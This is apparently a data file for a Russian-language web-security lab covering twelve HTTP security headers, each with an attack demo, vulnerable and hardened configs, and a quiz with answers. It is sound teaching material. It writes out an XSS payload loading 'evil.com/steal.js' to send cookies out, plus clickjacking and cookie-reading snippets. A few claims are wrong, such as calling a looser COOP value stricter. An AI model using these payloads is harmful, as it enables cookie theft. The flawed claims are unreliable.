// ============================================================
// Security Headers Lab Data
// ============================================================
export interface SecurityHeader {
  id: string;
  name: string;
  category: string;
  description: string;
  attackDemo: string;
  vulnerableConfig: string;
  secureConfig: string;
  quiz: {
    question: string;
    options: string[];
    correctIndex: number;
    explanation: string;
  };
}

export const securityHeaders: SecurityHeader[] = [
  {
    id: 'csp',
    name: 'Content-Security-Policy',
    category: 'xss',
    description:
      'CSP — самый мощный HTTP-заголовок для защиты от XSS. Он определяет, откуда браузер может загружать скрипты, стили, изображения, шрифты и другие ресурсы. Правильно настроенный CSP блокирует выполнение inline-скриптов и загрузку ресурсов с неавторизованных доменов.',
    attackDemo:
      'Без CSP злоумышленник внедряет <script src="https://evil.com/steal.js"></script> через XSS. Браузер выполняет скрипт, который отправляет cookies на сервер злоумышленника. С CSP «script-src \'self\'» — браузер блокирует загрузку внешнего скрипта.',
    vulnerableConfig: `// Нет CSP — браузер загружает скрипты отовсюду
app.use((req, res, next) => {
  // Никаких ограничений на источники ресурсов
  next();
});

// Злоумышленник может:
// 1. Загрузить скрипт с любого CDN
// 2. Выполнить inline-скрипт <script>alert(1)</script>
// 3. Подключить iframe с фишинговым сайтом`,
    secureConfig: `// Строгий CSP через helmet
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"],                    // Только свой домен
    styleSrc: ["'self'", "'unsafe-inline'"],  // Свой + inline стили
    imgSrc: ["'self'", 'data:', 'https:'],    // Свой + data + HTTPS
    fontSrc: ["'self'", 'https://fonts.gstatic.com'],
    frameSrc: ["'none'"],                     // Запрет iframe
    objectSrc: ["'none'"],                    // Запрет flash/object
    upgradeInsecureRequests: [],              // HTTP → HTTPS
  }
}));`,
    quiz: {
      question: 'Какая CSP-директива блокирует все inline-скрипты?',
      options: ["script-src 'unsafe-inline'", "script-src 'self'", 'default-src *', "script-src 'none'"],
      correctIndex: 1,
      explanation:
        "script-src 'self' разрешает загрузку скриптов только с текущего домена. Inline-скрипты (<script>тег</script>) и обработчики событий (onclick) блокируются. Для разрешения конкретного inline-скрипта нужен nonce или hash.",
    },
  },
  {
    id: 'hsts',
    name: 'Strict-Transport-Security',
    category: 'connection',
    description:
      'HSTS заставляет браузер всегда использовать HTTPS для данного домена, даже если пользователь вводит http://. Это предотвращает downgrade-атаки (SSL stripping), при которых злоумышленник на уровне сети конвертирует HTTPS-соединение в HTTP.',
    attackDemo:
      'Без HSTS: пользователь вводит http://bank.com. MITM-атакующий (через публичный Wi-Fi) перехватывает запрос и не перенаправляет на HTTPS. Пароль передаётся в открытом виде. С HSTS: браузер помнит, что bank.com всегда HTTPS, и автоматически использует защищённое соединение.',
    vulnerableConfig: `// Нет HSTS
app.use((req, res, next) => {
  // Пользователи могут зайти по HTTP
  // Нет принудительного редиректа на HTTPS
  next();
});

// Атака SSL Strip:
// 1. Пользователь: http://bank.com
// 2. Атакующий: перехватывает, не редиректит
// 3. Пароль передаётся открытым текстом`,
    secureConfig: `// HSTS через helmet
app.use(helmet.hsts({
  maxAge: 31536000,       // 1 год (в секундах)
  includeSubDomains: true, // Все поддомены тоже HTTPS
  preload: true           // Включить в HSTS preload list браузера
}));

// Или вручную:
res.setHeader(
  'Strict-Transport-Security',
  'max-age=31536000; includeSubDomains; preload'
);

// Редирект HTTP → HTTPS
app.use((req, res, next) => {
  if (req.protocol === 'http') {
    res.redirect(301, 'https://' + req.get('host') + req.url);
  } else {
    next();
  }
});`,
    quiz: {
      question: 'Что делает директива preload в HSTS?',
      options: [
        'Предзагружает SSL-сертификат',
        'Добавляет домен в встроенный список HSTS браузеров',
        'Ускоряет HTTPS-соединение',
        'Включает HSTS только для поддоменов',
      ],
      correctIndex: 1,
      explanation:
        'preload добавляет домен в HSTS Preload List — список, встроенный в браузеры (Chrome, Firefox, Safari). Даже первый визит на сайт будет через HTTPS, без необходимости сначала получить HSTS-заголовок.',
    },
  },
  {
    id: 'x-frame-options',
    name: 'X-Frame-Options',
    category: 'clickjacking',
    description:
      'X-Frame-Options запрещает (DEPRECATED: современные браузеры рекомендуют использовать CSP frame-ancestors вместо X-Frame-Options).  встраивание страницы в iframe, frame или object. Это защита от clickjacking — атаки, при которой невидимый iframe с целевым сайтом накладывается на видимую страницу, заставляя пользователя нажать на кнопку, которую он не видит.',
    attackDemo:
      'Без X-Frame-Options: злоумышленник создаёт страницу с прозрачным iframe, содержащим bank.com/transfer. Пользователь думает, что нажимает на кнопку «Получить приз», но на самом деле подтверждает перевод денег.',
    vulnerableConfig: `// Нет X-Frame-Options
app.use((req, res, next) => {
  // Любой сайт может встроить вашу страницу в iframe
  next();
});

// Атака clickjacking:
// <iframe src="https://bank.com/transfer"
//         style="opacity:0; position:absolute;
//                top:100px; left:100px;">
// </iframe>
// <button style="position:absolute; top:100px; left:100px;">
//   Получить приз!
// </button>`,
    secureConfig: `// Через helmet
app.use(helmet.frameguard({ action: 'deny' }));

// Или вручную:
res.setHeader('X-Frame-Options', 'DENY');
// SAMEORIGIN — разрешить iframe только с того же домена
// DENY — полностью запретить встраивание

// РЕКОМЕНДУЕТСЯ: Современный подход через CSP (X-Frame-Options deprecated в Chrome 94+, Firefox 131+):
app.use(helmet.contentSecurityPolicy({
  directives: {
    frameAncestors: ["'self'"], // Или 'none'
  }
}));`,
    quiz: {
      question: 'Какое значение X-Frame-Options полностью запрещает встраивание страницы в iframe?',
      options: ['SAMEORIGIN', 'ALLOW-FROM', 'DENY', 'BLOCK'],
      correctIndex: 2,
      explanation:
        'DENY полностью запрещает встраивание. SAMEORIGIN — только с того же домена. ALLOW-FROM deprecated. Примечание: X-Frame-Options сам считается устаревшим — используйте CSP frame-ancestors как основную защиту.',
    },
  },
  {
    id: 'x-content-type',
    name: 'X-Content-Type-Options',
    category: 'mime',
    description:
      'X-Content-Type-Options: nosniff запрещает браузеру определять MIME-тип файла по содержимому. Без этого заголовка браузер может интерпретировать файл с расширением .jpg как JavaScript, если содержимое выглядит как JS-код.',
    attackDemo:
      'Злоумышленник загружает файл avatar.jpg, содержащий: /* это изображение */ alert(document.cookie);. Без nosniff браузер видит JavaScript и выполняет его, несмотря на расширение .jpg. Это называется MIME-type sniffing attack.',
    vulnerableConfig: `// Нет X-Content-Type-Options
app.use(express.static('uploads'));
// Пользователь загружает файл:
// Content-Type: image/jpeg
// Содержимое: <script>alert('XSS')</script>

// Без nosniff:
// - Chrome: определяет по содержимому → исполняет как JS
// - Firefox: определяет по содержимому → исполняет как JS`,
    secureConfig: `// Через helmet
app.use(helmet.noSniff());

// Или вручную:
res.setHeader('X-Content-Type-Options', 'nosniff');

// Также важно: правильная отдача файлов
app.get('/uploads/:filename', (req, res) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Content-Disposition', 'attachment');
  res.sendFile(path.join(__dirname, 'uploads', req.params.filename));
});`,
    quiz: {
      question: 'Что предотвращает X-Content-Type-Options: nosniff?',
      options: [
        'Загрузку файлов без расширения',
        'Интерпретацию браузером файла как другого MIME-типа',
        'Скачивание вредоносных файлов',
        'Изменение Content-Type сервером',
      ],
      correctIndex: 1,
      explanation:
        'nosniff запрещает браузеру «угадывать» MIME-тип по содержимому файла. Браузер будет использовать только заголовок Content-Type, указанный сервером. Это предотвращает атаки, где файл с «безопасным» расширением содержит вредоносный код.',
    },
  },
  {
    id: 'referrer-policy',
    name: 'Referrer-Policy',
    category: 'privacy',
    description:
      'Referrer-Policy контролирует, сколько информации о предыдущей странице передаётся в заголовке Referer при переходе на другой сайт. Это важно для приватности — Referer может содержать sensitive данные (URL с параметрами, токены, поисковые запросы).',
    attackDemo:
      'Без Referrer-Policy: пользователь переходит с bank.com/transfer?token=abc123 на внешний сайт. Заголовок Referer: https://bank.com/transfer?token=abc123 передаётся внешнему серверу, раскрывая токен авторизации.',
    vulnerableConfig: `// Нет Referrer-Policy
// Браузер по умолчанию отправляет полный URL
// Referer: https://myapp.com/dashboard?user_id=123&session=abc

// Внешний сайт видит:
// - user_id пользователя
// - session token
// - путь к странице
// - параметры запроса`,
    secureConfig: `// Через helmet
app.use(helmet.referrerPolicy({
  policy: 'strict-origin-when-cross-origin'
}));

// Или вручную:
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

// Варианты:
// no-referrer          — никогда не отправлять Referer
// same-origin          — только для того же домена
// strict-origin        — только домен (без пути) для HTTPS→HTTPS
// strict-origin-when-cross-origin — полный URL для same-origin, только домен для cross-origin (рекомендуется)`,
    quiz: {
      question: 'Какое значение Referrer-Policy рекомендуется по умолчанию?',
      options: ['no-referrer', 'unsafe-url', 'strict-origin-when-cross-origin', 'same-origin'],
      correctIndex: 2,
      explanation:
        'strict-origin-when-cross-origin отправляет полный URL для навигации внутри того же домена, и только домен (без пути и параметров) для кросс-доменных переходов. Это баланс между функциональностью и приватностью.',
    },
  },
  {
    id: 'permissions-policy',
    name: 'Permissions-Policy',
    category: 'browserApi',
    description:
      'Permissions-Policy ограничивает использование браузерных API (камера, микрофон, геолокация, USB, Bluetooth и др.) для текущего документа и iframe. Замена устаревшего Feature-Policy. Защищает от злоупотребления API браузера через XSS или вредоносные iframe.',
    attackDemo:
      'Без Permissions-Policy: злоумышленник через XSS получает доступ к navigator.geolocation и отслеживает местоположение пользователя. Или использует navigator.mediaDevices.getUserMedia() для доступа к камере/микрофону.',
    vulnerableConfig: `// Нет Permissions-Policy
app.use((req, res, next) => {
  // Все API браузера доступны:
  // - Камера и микрофон
  // - Геолокация
  // - USB-устройства
  // - Bluetooth
  // - Clipboard
  // - Accelerometer, Gyroscope
  next();
});`,
    secureConfig: `// Запретить все неиспользуемые API
res.setHeader('Permissions-Policy', [
  'camera=()',           // Запрет камеры
  'microphone=()',       // Запрет микрофона
  'geolocation=()',      // Запрет геолокации
  'usb=()',              // Запрет USB
  'bluetooth=()',        // Запрет Bluetooth
  'clipboard-read=()',   // Запрет чтения буфера
  'clipboard-write=()',  // Запрет записи в буфер
  'accelerometer=()',    // Запрет акселерометра
  'gyroscope=()',        // Запрет гироскопа
  'payment=(self)',      // Разрешить только для same-origin
].join(', '));

// Разрешить только необходимые:
// Permissions-Policy: geolocation=(self), camera=()`,
    quiz: {
      question: 'Что делает директива camera=() в Permissions-Policy?',
      options: [
        'Разрешает камеру для всех',
        'Запрещает использование камеры',
        'Разрешает камеру только для localhost',
        'Требует HTTPS для камеры',
      ],
      correctIndex: 1,
      explanation:
        'camera=() с пустыми скобками означает «ни для кого». Это эквивалент DENY. camera=(self) разрешает только для same-origin. camera=(self https://trusted.com) разрешает для текущего домена и указанного источника.',
    },
  },
  {
    id: 'coop',
    name: 'Cross-Origin-Opener-Policy (COOP)',
    category: 'processIsolation',
    description:
      'Изолирует browsing context от кросс-origin окон, предотвращая атаки типа Spectre и Side Channel через window references.',
    attackDemo:
      'Злоумышленник открывает ваше приложение через window.open() и получает доступ к объекту окна, считывая данные через side-channel.',
    vulnerableConfig: `// Без COOP — другие окна могут получить ссылку на ваше окно
// Злоумышленник может использовать postMessage для взаимодействия
// или эксплуатировать shared array buffer атаки`,
    secureConfig: `// Изолировать browsing context
res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
// или строже:
res.setHeader('Cross-Origin-Opener-Policy', 'same-origin-allow-popups');

// same-origin — только same-origin окна имеют доступ
// unsafe-none — по умолчанию (уязвимо)`,
    quiz: {
      question: 'Какое значение COOP обеспечивает максимальную изоляцию?',
      options: ['unsafe-none', 'same-origin', 'same-origin-allow-popups', 'no-opener'],
      correctIndex: 1,
      explanation:
        'COOP: same-origin полностью изолирует browsing context — только same-origin документы имеют доступ к window reference. same-origin-allow-popups разрешает popups. unsafe-none — по умолчанию и уязвимо к cross-origin attacks.',
    },
  },
  {
    id: 'coep',
    name: 'Cross-Origin-Embedder-Policy (COEP)',
    category: 'resourceIsolation',
    description:
      'Контролирует загрузку кросс-origin ресурсов (изображений, скриптов, iframe). Вместе с COOP защищает от Spectre-подобных атак.',
    attackDemo:
      'Без COEP злоумышленник загружает ваш ресурс в iframe и извлекает данные через timing attacks или SharedArrayBuffer.',
    vulnerableConfig: `// Без COEP — любые кросс-origin ресурсы загружаются
// <img src="https://bank.com/account.jpg"> — загружается
// iframe с кросс-origin контентом — выполняется`,
    secureConfig: `// Требовать явного разрешения для кросс-origin ресурсов
res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');

// require-corp — кросс-origin ресурсы нужны с CORS/ CORP заголовками
// unsafe-none — по умолчанию (уязвимо)
// credentialless — загрузка без credentials`,
    quiz: {
      question: 'Что требует директива COEP: require-corp?',
      options: [
        'Все ресурсы должны быть с того же домена',
        'Кросс-origin ресурсы должны иметь CORS или CORP заголовки',
        'Все ресурсы должны использовать HTTPS',
        'Запрещает загрузку любых внешних ресурсов',
      ],
      correctIndex: 1,
      explanation:
        'COEP: require-corp требует, чтобы кросс-origin ресурсы предоставляли правильные CORS-заголовки или Cross-Origin-Resource-Policy. Это предотвращает загрузку ресурсов, которые не явно разрешили кросс-origin доступ.',
    },
  },
  {
    id: 'corp',
    name: 'Cross-Origin-Resource-Policy (CORP)',
    category: 'resourceProtection',
    description:
      'Предотвращает чтение ресурсов (изображений, скриптов, CSS) другими origin. Защищает от XSS и side-channel атак на уровне ресурсов.',
    attackDemo:
      'Злоумышленник встраивает <img src="https://yourapp.com/internal/data.png"> и через timing attack определяет, загружено ли изображение.',
    vulnerableConfig: `// Без CORP — любой сайт может встроить ваши ресурсы
// <img src="https://yourapp.com/logo.png"> — загружается
// <link rel="stylesheet" href="https://yourapp.com/style.css"> — загружается`,
    secureConfig: `// Запретить другим origin чтение ваших ресурсов
res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
// или:
res.setHeader('Cross-Origin-Resource-Policy', 'same-site');

// same-origin — только same-origin может загружать
// same-site — same-site и same-origin
// cross-origin — явно разрешить всем (с CORS)`,
    quiz: {
      question: 'Что делает CORP: same-origin?',
      options: [
        'Разрешает загрузку ресурсов только с того же origin',
        'Запрещает все кросс-origin запросы',
        'Требует аутентификацию для ресурсов',
        'Блокирует загрузку изображений',
      ],
      correctIndex: 0,
      explanation:
        'CORP: same-origin запрещает другим origin загружать ваши ресурсы через img, script, link и другие embed-теги. Это предотвращает side-channel атаки, где злоумышленник определяет наличие/содержимое ресурсов.',
    },
  },
  {
    id: 'cache-control',
    name: 'Cache-Control (для чувствительных данных)',
    category: 'caching',
    description:
      'Контролирует кэширование страниц и ответов сервера. Без правильных директив чувствительные данные (пароли, токены, персональная информация) могут сохраняться на диске браузера или в кэше промежуточных прокси.',
    attackDemo:
      'Пользователь выходит из общего компьютера. Следующий пользователь нажимает «Назад» в браузере и видит аутентифицированную страницу из кэша.',
    vulnerableConfig: `// Без Cache-Control — браузер кэширует все страницы
// Прокси-серверы кэшируют ответы с персональными данными
// Диск браузера содержит чувствительную информацию

app.get('/dashboard', (req, res) => {
  // Нет заголовков кэширования
  res.json({ user: req.user, data: sensitiveData });
});`,
    secureConfig: `// Запретить кэширование для аутентифицированных страниц
app.use('/api', (req, res, next) => {
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

// no-store — не хранить ничего
// no-cache — проверять с сервером перед использованием
// must-revalidate — использовать только пока свежий`,
    quiz: {
      question: 'Какая директива Cache-Control полностью запрещает сохранение ответа?',
      options: ['no-cache', 'no-store', 'private', 'max-age=0'],
      correctIndex: 1,
      explanation:
        'Cache-Control: no-store полностью запрещает браузеру и прокси сохранять любую копию ответа. no-cache разрешает кэширование, но требует проверки с сервером. private разрешает кэширование только в браузере (не в прокси).',
    },
  },
  {
    id: 'x-dns-prefetch-control',
    name: 'X-DNS-Prefetch-Control',
    category: 'browserPrivacy',
    description:
      'Контролирует DNS-prefetching — функцию браузера, которая заранее разрешает домены из ссылок на странице. Может раскрывать пользовательскую активность DNS-серверу.',
    attackDemo:
      'На странице с ссылками на evil.com браузер автоматически делает DNS-запрос к evil.com, раскрывая интерес пользователя этому домену.',
    vulnerableConfig: `// DNS prefetching включён по умолчанию
// <a href="https://tracker.com">Link</a>
// Браузер автоматически разрешает tracker.com ещё до клика
// DNS-сервер видит запрос`,
    secureConfig: `// Отключить DNS prefetching
res.setHeader('X-DNS-Prefetch-Control', 'off');

// off — запретить DNS prefetching
// on — разрешить (по умолчанию)`,
    quiz: {
      question: 'Что делает X-DNS-Prefetch-Control: off?',
      options: [
        'Запрещает все DNS-запросы',
        'Отключает автоматическое разрешение доменов из ссылок на странице',
        'Блокирует загрузку внешних ресурсов',
        'Требует DNSSEC для всех запросов',
      ],
      correctIndex: 1,
      explanation:
        'X-DNS-Prefetch-Control: off запрещает браузеру предварительно разрешать домены из ссылок на странице. Это защищает приватность — DNS-сервер не видит, какие ссылки есть на странице, пока пользователь не кликнет.',
    },
  },
  {
    id: 'clear-site-data',
    name: 'Clear-Site-Data',
    category: 'safeExit',
    description:
      'Очищает данные браузера (cookies, storage, cache) для текущего origin при logout. Гарантирует, что после выхода не остаётся следов аутентификации.',
    attackDemo:
      'Пользователь выходит из приложения, но cookies и localStorage остаются. При XSS-атаке злоумышленник извлекает остатки сессионных данных.',
    vulnerableConfig: `// При logout — только удаление сессии на сервере
app.post('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/login');
  // Cookies и localStorage остаются в браузере!
});`,
    secureConfig: `// Очистить все данные браузера при logout
app.post('/logout', (req, res) => {
  req.session.destroy();
  res.setHeader('Clear-Site-Data', '"cookies", "storage", "cache"');
  // Также можно: "executionContexts" — закрывает service workers
  res.redirect('/login');
});

// "cookies" — удаляет все cookies
// "storage" — localStorage, sessionStorage, IndexedDB
// "cache" — service worker cache, HTTP cache`,
    quiz: {
      question: 'Что делает Clear-Site-Data: "cookies", "storage"?',
      options: [
        'Запрещает установку cookies',
        'Очищает cookies и клиентское хранилище для текущего origin',
        'Блокирует XSS-атаки',
        'Перенаправляет на страницу входа',
      ],
      correctIndex: 1,
      explanation:
        'Clear-Site-Data — ответный заголовок, который instructs браузер очистить данные для текущего origin. "cookies" удаляет все cookies, "storage" — localStorage, sessionStorage и IndexedDB. Полезно при logout для полной очистки.',
    },
  },
];
